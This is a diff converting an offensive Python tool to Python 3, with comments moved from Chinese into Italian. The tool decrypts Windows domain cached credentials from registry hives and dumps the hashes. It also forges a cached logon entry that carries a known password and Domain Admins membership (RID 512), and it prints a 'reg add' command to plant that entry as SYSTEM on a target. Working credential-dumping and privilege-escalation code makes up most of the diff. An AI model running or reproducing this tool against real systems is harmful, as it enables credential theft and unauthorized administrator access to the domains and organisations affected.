@@ -1,6 +1,8 @@
 # encoding: utf-8
-# author: n1nty @ 360 A-TEAM
-# date: 2018-08-21
+# conversion to python3: Massimiliano Dal Cero @ Digital Defense
+# original author (python2): n1nty @ 360 A-TEAM
+# date: 2025-05-05
+
 '''
 A small tool to play around with windows domain cached credentials, mainly based on the work of mimikatz and impacket 
 '''
@@ -26,6 +28,8 @@ def pad(data):
         return data
 
 # implementation of kull_m_crypto_aesCTSEncrypt from mimikatz
+from Crypto.Cipher import AES
+
 def decrypt(cipher, key, iv):
     szData = len(cipher)
     aes = AES.new(key, AES.MODE_CBC, iv)
@@ -33,34 +37,35 @@ def decrypt(cipher, key, iv):
     nbBlock = (szData + 15) >> 4
     lastLen = (szData & 0xf) if (szData & 0xf) else 16
 
-    # 不解密 cipher 的最后两组
+    # Non decriptare gli ultimi due blocchi
     plaintext = aes.decrypt(cipher[:16 * (nbBlock - 2)])
 
-    # buffer 包含最后没解密的两组
-    buffer = cipher[16 * (nbBlock -2):]
+    # Buffer che contiene gli ultimi due blocchi non decriptati
+    buffer = bytearray(cipher[16 * (nbBlock - 2):])  # Convertiamo il buffer in un bytearray
     padding_count = 32 - len(buffer)
 
-    # 将 buffer padding 至 32 位
-    buffer += padding_count * '\x00'
-    buffer = list(buffer)
+    # Padding del buffer fino a 32 byte
+    buffer += padding_count * b'\x00'
 
-    aes_noiv = AES.new(key, AES.MODE_CBC, IV='\x00'*16)
+    # AES senza IV per decriptare i blocchi finali
+    aes_noiv = AES.new(key, AES.MODE_CBC, iv=b'\x00' * 16)
 
-    # 解密 buffer 第 1 组
-    tmp = aes_noiv.decrypt(''.join(buffer[:16]))
+    # Decriptazione del primo blocco del buffer
+    tmp = aes_noiv.decrypt(buffer[:16])
 
+    # XOR tra i byte decriptati e il resto del buffer
     for i in range(16):
-        buffer[i] = chr(ord(tmp[i]) ^ ord(buffer[i+16]))
+        buffer[i] = tmp[i] ^ buffer[i + 16]
 
-    #buffer[lastLen + 16: lastLen + 16 + 16 - lastLen] = buffer[lastLen: lastLen + 16 - lastLen]
+    # Correzione del buffer con la parte mancante
     buffer[lastLen + 16: 32] = buffer[lastLen: 16]
 
-    a = ''.join(buffer[16:])
-    plaintext += aes.decrypt(a)
-    plaintext += ''.join(buffer[:lastLen])
+    # Concatenazione finale
+    plaintext += aes.decrypt(bytes(buffer[16:]))
+    plaintext += bytes(buffer[:lastLen])
 
     return plaintext
-        # &buffer[7 + 16], &buffer[7], 16 - 7
+
 
 # implementation of kull_m_crypto_aesCTSEncrypt from mimikatz
 def encrypt(plaintext, key, iv):
@@ -70,14 +75,13 @@ def encrypt(plaintext, key, iv):
 
     aes = AES.new(key, AES.MODE_CBC, iv)
 
-    # 不加密最后两组
     cipher = aes.encrypt(plaintext[:16 * (nbBlock - 2)])
 
     buffer = plaintext[16 * (nbBlock -2):]
     padding_count = 32 - len(buffer)
 
-    # 将 buffer padding 至 32 位
-    buffer += padding_count * '\x00'
+    # buffer padding 32 
+    buffer += padding_count * b'\x00'
     buffer = aes.encrypt(buffer)
 
     cipher += buffer[16:32]
@@ -210,7 +214,7 @@ class EncData(object):
             'username': self.username,
             'lastwrite':filetime_to_dt(self._nl['LastWrite']),
             'groups': ', '.join(map(str, self.groups)),
-            'hash': self.mshashdata.encode('hex'),
+            'hash': self.mshashdata.hex(),
             'domain': self.domain,
             'dns domain name': self.dns_domainname,
             'UPN': self.upn,
@@ -220,18 +224,18 @@ class EncData(object):
             'profile path': self.profilepath,
             'home': self.home,
             'home drive': self.home_drive,
-            'checksum': self._nl['CH'].encode('hex'),
-            'IV': self._nl['IV'].encode('hex')
+            'checksum': self._nl['CH'].hex(),
+            'IV': self._nl['IV'].hex()
         })
         return ss
 
 
     def setpassword(self, password):
         hash = msdcc2.hash(password, self.username)
-        self.mshashdata = hash.decode('hex')
+        self.mshashdata = bytes.fromhex(hash)
 
     def encode(self):
-        d = ''
+        d = b''
 
         for v in [self.mshashdata, self.unkhash, self.unk0, self.szSC, self.unkLength,
                   self.unk2, self.unk3, self.unk4, self.unk5, self.unk6, self.unk7, self.unk8]:
@@ -276,7 +280,7 @@ class EncData(object):
     def pack_pad(self, d, unicodestr=True):
         d = d.encode('utf-16le') if unicodestr else d
         l = len(d)
-        d += '\x00' * (pad(len(d)) - len(d))
+        d += b'\x00' * (pad(len(d)) - len(d))
         return d, l
 
 
@@ -293,7 +297,7 @@ class Secrets(LSASecrets):
         if not self.credentials:
             values = self.enumValues('\\Cache')
             if values is None:
-                print 'no cached credentials'
+                print('no cached credentials')
                 return
 
             try:
@@ -306,25 +310,29 @@ class Secrets(LSASecrets):
             self._LSASecrets__getNLKMSecret()
 
             for value in values:
-                nl = NL_RECORD(self.getValue(ntpath.join('\\Cache', value))[1])
-                if nl['IV'] != '\x00' *16:
-                    en = EncData(nl, self._LSASecrets__NKLMKey, value)
-                    self.credentials.append(en)
+                path = ntpath.join('\\Cache', value.decode('utf-8'))
+                cached_data = self.getValue(path)
+                try:
+                    nl = NL_RECORD(cached_data[1])
+                    if nl['IV'] != '\x00' * 16:
+                        en = EncData(nl, self._LSASecrets__NKLMKey, value)
+                        self.credentials.append(en)
+                except:
+                    pass
 
     def dump(self):
         self.prepare()
-        print 'dumping domain cached credentials'
+        print('dumping domain cached credentials')
         for cre in self.credentials:
-            print cre.format()
+            print(cre.format())
 
     def patch(self, user):
         self.prepare()
-
         for cre in self.credentials:
             if cre.username == user:
                 cre.logon_domainname = 'FAKE'
                 cre.domain = 'FAKE'
-                cre.dns_domainname = 'FAKE.COM'
+                cre.dns_domainname = 'FAKE.IT'
 
                 uname = 'fakeuser'
                 cre.username = uname
@@ -332,14 +340,14 @@ class Secrets(LSASecrets):
                 cre.effective_name = uname
                 # cre._nl['UserId'] = 6666
 
-                password = 'n1nty@360 A-TEAM'
+                password = 'S0n0_Bell0'
                 cre.setpassword(password)
 
                 if not cre.is_domainadmin():
                     cre.add_group(relative_id=512)
 
 
-                print '''execute as SYSTEM on target: 
+                print('''execute as SYSTEM on target: 
     reg add "HKEY_LOCAL_MACHINE\SECURITY\Cache" /v "{nl}" /t REG_BINARY /d {binary} /f
 
 user being patched:
@@ -350,21 +358,19 @@ logon information:
     username: {domain}\{username}
     password: {password}
     * you can logon with credential above when there is !!!no contact with DC!!!. When there is, you can't do that
-                '''.format(patched_user=user, domain=cre.domain, username=cre.username, password=password, nl=cre.valuename, binary=cre.dump().encode('hex'))
+                '''.format(patched_user=user, domain=cre.domain, username=cre.username, password=password, nl=cre.valuename, binary=cre.dump().hex()))
 
                 break
 
-        else:
-            print 'not able to patch, there is no cached credential for', user
-            print
-
-            self.dump()
+            #else:
+            #    print('not able to patch, there is no cached credential for ' + user + "\n")
+            #    self.dump()
 
 
 if __name__ == '__main__':
     from optparse import OptionParser
     parser = OptionParser(usage='''
-    A small tool by n1nty @ 360 A-TEAM to play around with windows domain cached credentials, mainly based on the work of mimikatz and impacket
+    A small tool by n1nty @ 360 A-TEAM and converted to Python3 by Massimiliano Dal Cero, to play around with windows domain cached credentials, mainly based on the work of mimikatz and impacket
     Works for post-Vista systems.
     
     {script} --system <system file> --security <security file>
